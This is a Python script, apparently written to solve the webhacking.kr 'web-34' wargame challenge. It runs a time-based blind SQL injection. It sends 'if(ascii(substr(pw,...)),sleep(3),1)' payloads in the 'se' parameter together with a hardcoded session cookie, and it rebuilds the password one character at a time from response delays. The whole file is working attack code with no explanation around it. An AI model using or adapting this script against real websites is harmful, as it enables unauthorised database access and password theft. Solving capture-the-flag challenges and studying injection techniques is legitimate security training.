import requests
import time
import string

url = 'https://webhacking.kr/challenge/web-34/index.php?msg=123&se='
cookies = {
    'PHPSESSID' : 'rv6qnkudjjd4ub00d97r8hgjoq'
}
dictionary = string.ascii_letters + string.punctuation + string.digits
result = ''

for i in range(1, 30):
    mark = 0
    for letter in dictionary:
        payload = 'if(ascii(substr(pw,{},1))={},sleep(3),1)=1'.format(i, ord(letter))
        print(payload)
        start = time.time()
        response = requests.get(url + payload, cookies=cookies)
        if time.time() - start > 3:
            result += letter
            mark = 1
            break
    if mark is 0:
        break
print(result)